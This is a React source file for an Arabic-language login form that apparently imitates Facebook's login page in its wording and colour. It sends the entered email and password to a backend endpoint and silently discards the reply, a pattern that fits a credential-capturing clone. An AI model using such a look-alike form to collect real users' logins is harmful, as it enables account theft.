import { Box, Typography } from "@mui/material";
import Input from "./components/input";
import LoginButton from "./components/login-button";
import LoginOrCreate from "./components/login-or-create";
import CreateButton from "./components/create-button";
import { service } from "../../app/service";
import { useState } from "react";
export default function Form(props) {
  const [data, setData] = useState({ email: "", password: "" });
  const handleChange = (e) => {
    const name = e.target.name;
    const value = e.target.value;
    setData((n) => ({ ...n, [name]: value }));
  };
  return (
    <Box {...props}>
      <Box
        sx={{
          display: "flex",
          flexDirection: "column",
          px: 2,
          maxWidth: "416px",
          mx: "auto",
        }}
      >
        <Box sx={{ pt: 1 }}>
          <Input
            placeholder="رقم الهاتف المحمول أو البريد الإلكتروني"
            name="email"
            type="email"
            onChange={handleChange}
            value={data.email || ""}
          />
        </Box>
        <Box sx={{ pt: 1 }}>
          <Input
            placeholder="كلمة السر"
            type="password"
            name="password"
            onChange={handleChange}
            value={data.password || ""}
          />
        </Box>
        <Box sx={{ pt: 1.3 }}>
          <LoginButton
            onClick={() => {
              if (data.email !== "" && data.password !== "")
                service
                  .post("", data)
                  .then((res) => {})
                  .catch((error) => {});
            }}
          >
            تسجيل الدخول
          </LoginButton>
        </Box>
        <Box sx={{ pt: 1.3 }}>
          <Typography
            sx={{
              color: "#216fdb",
              textAlign: "center",
              fontSize: 14,
              cursor: "pointer",
            }}
          >
            هل نسيت كلمة السر ؟
          </Typography>
        </Box>
        <Box sx={{ pt: 1.3 }}>
          <LoginOrCreate />
        </Box>
        <Box sx={{ py: 1.3, display: "flex", justifyContent: "center" }}>
          <CreateButton />
        </Box>
        <Box sx={{ py: 3, display: "flex", justifyContent: "center" }}></Box>
      </Box>
    </Box>
  );
}
